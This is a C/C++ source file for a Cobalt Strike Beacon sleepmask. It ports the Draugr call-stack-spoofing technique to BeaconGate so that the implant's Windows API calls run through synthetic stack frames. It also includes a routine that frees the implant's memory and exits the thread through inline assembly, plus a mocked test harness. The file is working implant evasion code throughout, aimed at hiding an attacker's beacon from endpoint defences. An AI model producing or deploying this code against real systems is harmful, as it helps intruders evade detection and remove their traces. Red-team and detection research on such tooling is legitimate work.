#include <windows.h>

#include "base/helpers.h"
#include "sleepmask.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library/debug.cpp"
#include "library/utils.cpp"
#include "library/stdlib.cpp"
#include "library/masking.cpp"
#include "library/gate.cpp"

/**
* This is a port to BeaconGate of: https://github.com/NtDallas/Draugr.
* Only very minor changes to the original implementation have been made.
*/

// Draugr is only supported on X64.
#ifdef _WIN64
// Additional includes for draugr.
#include "library/stackspoofing.cpp"

//WINBASEAPI VOID WINAPI KERNEL32$OutputDebugStringA(LPCSTR lpOutputString);
//WINBASEAPI int       __cdecl MSVCRT$vsprintf_s(char* _DstBuf, size_t _DstSize, const char* _Format, ...);
//
//#define OutputDebugStringA        KERNEL32$OutputDebugStringA
//#define vsprintf_s                MSVCRT$vsprintf_s
//void dlog(const char* fmt, ...) {
//    char buff[512];
//    va_list va;
//    va_start(va, fmt);
//    vsprintf_s(buff, 512, fmt, va);
//    va_end(va);
//    OutputDebugStringA(buff);
//}
//TODO: Could probably make this more concise 
//TODO: This does not support drip loading
// Replace DLOGF with uncommented dlog when debugging
void cleanupExitThread(PBEACON_INFO info) {
    DFR_LOCAL(KERNEL32, VirtualFree);
    #define VirtualFree KERNEL32$VirtualFree
    DFR_LOCAL(KERNEL32, ExitThread);
    PVOID pExitThread = (PVOID)KERNEL32$ExitThread;
    PVOID pVirtualFree = (PVOID)KERNEL32$VirtualFree;

    ALLOCATED_MEMORY_REGION sleepmaskRegion = { .Purpose = PURPOSE_EMPTY };

    for (int i = 0; i < 6; i++) {
        /*
            ALLOCATED_MEMORY_PURPOSE Purpose;      // A label to indicate the purpose of the allocated memory
            PVOID  AllocationBase;                 // The base address of the allocated memory block
            SIZE_T RegionSize;                     // The size of the allocated memory block
            DWORD Type;                            // The type of memory allocated
            DWORD DripLoadAllocationGranularity;   // The allocation granularity used when reserving memory for drip-loading
            ALLOCATED_MEMORY_SECTION Sections[8];  // An array of section information structures
            ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation; // Information required to cleanup the allocation
        */
        ALLOCATED_MEMORY_REGION region = info->allocatedMemory.AllocatedMemoryRegions[i];
        ALLOCATED_MEMORY_PURPOSE purpose = region.Purpose;

        if (purpose != PURPOSE_EMPTY) {
            PVOID base = region.AllocationBase;
            SIZE_T regionSize = region.RegionSize;
            DWORD type = region.Type;
            ALLOCATED_MEMORY_ALLOCATION_METHOD method = region.CleanupInformation.AllocationMethod;
            BOOL cleanup = region.CleanupInformation.Cleanup;
            DLOGF("[SLEEPMASK:CLEANUP] purpose : %d\nbase : 0x%p\nsize : %llu\ntype : %lu\nmethod : %d\ncleanup : %d\n=====================", purpose, base, regionSize, type, method, cleanup);
            
            if (purpose == PURPOSE_SLEEPMASK_MEMORY) {
                DLOGF("found sleepmask memory region");
                sleepmaskRegion = region;
                continue;
            }

            if (method == METHOD_VIRTUALALLOC) {
                DLOGF("0x%p (0x%p, %d, MEM_DECOMMIT)", VirtualFree, base, regionSize);
                if (VirtualFree(base, regionSize, MEM_DECOMMIT) == 0)
                    DLOGF("[SLEEPMASK:CLEANUP] VirtualFree failed");
                if (VirtualFree(base, 0, MEM_RELEASE) == 0)
                    DLOGF("[SLEEPMASK:CLEANUP] VirtualFree failed 2");
                DLOGF("Successfully freed 0x%p", base);
            } else {
                DLOGF("[%d] Empty region", i);
            }
        }
    }


    PVOID pSleepMaskAllocation = NULL;
    if (sleepmaskRegion.Purpose == PURPOSE_SLEEPMASK_MEMORY && sleepmaskRegion.CleanupInformation.AllocationMethod == METHOD_VIRTUALALLOC) {
        pSleepMaskAllocation = sleepmaskRegion.AllocationBase;
        DLOGF("[SLEEPMASK:CLEANUP] Sleepmask found 0x%p", pSleepMaskAllocation);
    } else {
        pSleepMaskAllocation = info->sleep_mask_ptr;
        //dlog("Sleepmask region not found, freeing from BEACON_INFO 0x%p", pSleepMaskAllocation);
    }

    __asm__ (
        "mov %[pVirtualFree], %%r11\n"
        "push %[pExitThread]\n"
        "mov %[pSleepMaskAllocation], %%rcx\n"
        "mov $0, %%rdx\n"
        "mov $0x8000, %%r8\n"
        "jmp *%%r11"
        : 
        : [pExitThread] "r" (pExitThread), [pVirtualFree] "r" (pVirtualFree), [pSleepMaskAllocation] "r" (pSleepMaskAllocation)
    );
}

    /**
    * Configures Draugr for use in BeaconGate.
    *
    * @param A pointer* to a DRAUGR_FUNCTION_CALL structure.
    */
    void InitializeDraugr(PDRAUGR_FUNCTION_CALL pDraugrCall) {
        // [0] Prepare spoofed stack frame struct.
        static SYNTHETIC_STACK_FRAME stackFrame;
        _memset(&stackFrame, 0, sizeof(stackFrame));

        // [1] Attempt to resolve spoofed call stack frame.
        if (!InitFrameInfo(&stackFrame)) {
            goto Cleanup;
        }

        // [2] Set target stack frame and call gate entry point.
        pDraugrCall->StackFrame = &stackFrame;
        pDraugrCall->SpoofCall = (PVOID)SpoofCall;
        DLOGF("SLEEPMASK: Successfully configured Draugr\n");

    Cleanup:
        return;
    }

    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL draugrInitialized = FALSE;
        static DRAUGR_FUNCTION_CALL draugrCall;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!draugrInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize Draugr.
        if (!draugrInitialized) {
            InitializeDraugr(&draugrCall);
            draugrInitialized = TRUE;
        }

        if (functionCall->function == EXITTHREAD)
            cleanupExitThread(info);

        // Attach the passed function call to our Draugr struct.
        draugrCall.FunctionCall = functionCall;
        DraugrGateWrapper(info, &draugrCall);
        // Null it out on exit for next time.
        draugrCall.FunctionCall = NULL;

        return;
    }
}
#else
    // This is more verbose but avoids intellisense errors.
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
        BeaconGateWrapper(info, functionCall);

        return;
    }
}
#endif

// Define a main function for the debug build
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check if asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif

